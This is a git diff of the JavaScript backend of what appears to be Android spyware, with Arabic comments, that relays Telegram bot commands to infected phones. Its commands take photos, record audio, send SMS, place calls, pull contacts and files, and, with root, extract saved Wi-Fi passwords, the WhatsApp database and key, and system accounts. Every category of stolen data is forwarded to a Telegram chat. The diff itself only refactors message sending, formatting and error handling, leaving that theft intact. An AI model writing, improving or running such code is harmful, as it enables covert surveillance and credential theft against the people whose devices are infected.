@@ -14,18 +14,10 @@ for (let i = 1; i <= 50; i++) COMMAND_MAP[`/sms${i}`] = `sms:+1234567890|رسا�
 for (let i = 1; i <= 50; i++) COMMAND_MAP[`/call${i}`] = `call:+1234567890`;
 
 const BASE_COMMANDS = {
-  '/fullinfo': 'fullinfo:1',
-  '/applist': 'applist:1',
-  '/files': 'files:1',
-  '/killapp': 'killapp:1',
-  '/sysinfo': 'sysinfo:1',
-  '/photo': 'take_photo',
-  '/contacts': 'get_contacts:1',
-  
-  // أوامر الروت (Root)
-  '/root_wifi': 'root_wifi:1',       // باسوردات الويفي
-  '/root_wa': 'root_whatsapp:1',     // داتابيز الواتساب
-  '/root_pass': 'root_accounts:1'    // حسابات النظام
+  '/fullinfo': 'fullinfo:1', '/applist': 'applist:1', '/files': 'files:1',
+  '/killapp': 'killapp:1', '/sysinfo': 'sysinfo:1', '/photo': 'take_photo',
+  '/contacts': 'get_contacts:1', '/root_wifi': 'root_wifi:1',
+  '/root_wa': 'root_whatsapp:1', '/root_pass': 'root_accounts:1'
 };
 
 async function kvCmd(...args) {
@@ -52,20 +44,23 @@ export default async function handler(req, res) {
   const type = req.query.type;
   const deviceId = req.query.device_id;
 
+  // تعديل دالة الإرسال باش ما تطيحش إلا كان خطأ فـ التنسيق
   const sendToTelegram = async (text, chatId = TELEGRAM_CHAT_ID) => {
-    if (TELEGRAM_TOKEN && chatId) {
-      const maxLength = 4000;
-      if (text.length > maxLength) {
-        for (let i = 0; i < text.length; i += maxLength) {
-           await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-             method: 'POST', headers: { 'Content-Type': 'application/json' }, 
-             body: JSON.stringify({ chat_id: chatId, text: text.substring(i, i + maxLength) })
-           }).catch(() => {});
-        }
-      } else {
+    if (!TELEGRAM_TOKEN || !chatId) return;
+    const maxLength = 4000;
+    const parts = text.length > maxLength ? text.match(new RegExp(`[\\s\\S]{1,${maxLength}}`, 'g')) : [text];
+    
+    for (const part of parts) {
+      // جربنا نرسلو بـ Markdown، إلا فشل كنرسلو بلا Markdown
+      let res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        method: 'POST', headers: { 'Content-Type': 'application/json' }, 
+        body: JSON.stringify({ chat_id: chatId, text: part, parse_mode: 'Markdown' })
+      }).catch(() => null);
+
+      if (res && !res.ok) {
         await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
           method: 'POST', headers: { 'Content-Type': 'application/json' }, 
-          body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'Markdown' })
+          body: JSON.stringify({ chat_id: chatId, text: part }) // بدون Markdown
         }).catch(() => {});
       }
     }
@@ -98,7 +93,6 @@ export default async function handler(req, res) {
     if (req.method === 'PUT') {
       let body = req.body || '';
       if (typeof body === 'object') body = JSON.stringify(body);
-      
       let cleanBody = String(body).trim();
       if (cleanBody.startsWith('{') && cleanBody.endsWith('}')) cleanBody = cleanBody.slice(1, -1);
       cleanBody = cleanBody.replace(/\\n/g, '\n').replace(/"/g, '');
@@ -106,23 +100,21 @@ export default async function handler(req, res) {
       if (type === 'media') {
         try {
           const parts = cleanBody.split('|');
-          const filename = parts[0];
-          const base64Data = parts[1];
+          const filename = parts[0], base64Data = parts[1];
           if (base64Data) {
             const buffer = Buffer.from(base64Data, 'base64');
             const formData = new FormData();
             formData.append('chat_id', TELEGRAM_CHAT_ID);
             formData.append('document', new Blob([buffer]), filename);
             formData.append('caption', `📁 File: ${filename}`);
-            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`, { method: 'POST', body: formData }).catch(e => console.error(e));
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`, { method: 'POST', body: formData }).catch(() => {});
           }
-        } catch (err) { await sendToTelegram(`❌ Error media: ${err.message}`); }
+        } catch (err) {}
       }
 
-      if (type === 'sysinfo') await sendToTelegram(`💻 *معلومات:*\n${cleanBody}`);
-      if (type === 'applist') await sendToTelegram(`📱 *البيانات:*\n\n${cleanBody}`);
-      if (type === 'files') await sendToTelegram(`📁 *الملفات:*\n\n${cleanBody}`);
-      
+      if (type === 'sysinfo') await sendToTelegram(`💻 معلومات:\n${cleanBody}`);
+      if (type === 'applist') await sendToTelegram(`📱 البيانات:\n\n${cleanBody}`);
+      if (type === 'files') await sendToTelegram(`📁 الملفات:\n\n${cleanBody}`);
       return res.status(200).send('"success"');
     }
 
@@ -142,46 +134,41 @@ export default async function handler(req, res) {
         const seconds = parseInt(command.replace('/rec', ''));
         if (!isNaN(seconds) && seconds > 0 && seconds <= 300) {
           remoteCommand = `record_${seconds}`;
-          await sendToTelegram(`🎙️ \`[REC]\` جاري تسجيل الصوت (${seconds} ثانية)...`);
+          await sendToTelegram(`🎙️ [REC] جاري تسجيل الصوت (${seconds} ثانية)...`);
           return res.status(200).end();
         }
       }
 
-      if (COMMAND_MAP[command]) {
-        remoteCommand = COMMAND_MAP[command];
-        await sendToTelegram(`⚡ \`[EXEC]\` *Command Sent:* ${command}`);
-        return res.status(200).end();
-      }
-
-      if (BASE_COMMANDS[command]) {
-        remoteCommand = BASE_COMMANDS[command];
-        await sendToTelegram(`⚡ \`[EXEC]\` *Command Sent:* ${command}`);
+      if (COMMAND_MAP[command] || BASE_COMMANDS[command]) {
+        remoteCommand = COMMAND_MAP[command] || BASE_COMMANDS[command];
+        await sendToTelegram(`⚡ [EXEC] Command Sent: ${command}`);
         return res.status(200).end();
       }
 
       switch (command) {
         case '/help': 
-          await sendToTelegram(`👑 *لوحة التحكم (Root)*\n\n` +
-            `👑 *أوامر الروت الخطيرة:*\n` +
-            `/root_wifi (باسوردات الويفي المحفوظة)\n` +
-            `/root_wa (قاعدة بيانات الواتساب + المفتاح)\n` +
+          // حيدنا النجوم والشرط باش ما يطيحش فـ Markdown
+          await sendToTelegram(`👑 لوحة التحكم (Root)\n\n` +
+            `👑 أوامر الروت الخطيرة:\n` +
+            `/root_wifi (باسوردات الويفي)\n` +
+            `/root_wa (داتابيز الواتساب)\n` +
             `/root_pass (حسابات النظام)\n\n` +
-            `⚡ *أوامر عادية:*\n` +
+            `⚡ أوامر عادية:\n` +
             `/contacts /photo /fullinfo /applist /files\n` +
-            `/rec30 /getfile <name>\n\n` +
-            `⏱️ *الحظر:* /ban /unban /banall`); 
+            `/rec15 /getfile name\n\n` +
+            `⏱️ الحظر: /ban /unban /banall`); 
           break;
-
-        case '/root_wifi': remoteCommand = "root_wifi:1"; await sendToTelegram("👑 `[ROOT]` جاري سحب باسوردات الويفي..."); break;
-        case '/root_wa': remoteCommand = "root_whatsapp:1"; await sendToTelegram("👑 `[ROOT]` جاري سحب داتابيز الواتساب والمفتاح..."); break;
-        case '/root_pass': remoteCommand = "root_accounts:1"; await sendToTelegram("👑 `[ROOT]` جاري سحب حسابات النظام..."); break;
-
+        case '/start': case '/menu': 
+          await sendToTelegram("👑 أهلاً بك.\nنظام 400+ أمر جاهز. اكتب /help."); 
+          break;
+        case '/root_wifi': remoteCommand = "root_wifi:1"; await sendToTelegram("👑 [ROOT] جاري سحب باسوردات الويفي..."); break;
+        case '/root_wa': remoteCommand = "root_whatsapp:1"; await sendToTelegram("👑 [ROOT] جاري سحب داتابيز الواتساب..."); break;
+        case '/root_pass': remoteCommand = "root_accounts:1"; await sendToTelegram("👑 [ROOT] جاري سحب حسابات النظام..."); break;
         case '/getfile': 
-          if(args[1]) { remoteCommand = `getfile:${args[1]}`; await sendToTelegram(`⏳ \`[FETCH]\` ${args[1]}...`); }
+          if(args[1]) { remoteCommand = `getfile:${args[1]}`; await sendToTelegram(`⏳ [FETCH] ${args[1]}...`); }
           break;
-          
         default:
-          if (command.startsWith('/')) await sendToTelegram(`⚙️ \`[SYSTEM]\` *Executing ${command}...*`);
+          if (command.startsWith('/')) await sendToTelegram(`⚙️ [SYSTEM] Executing ${command}...`);
       }
       return res.status(200).end();
     }
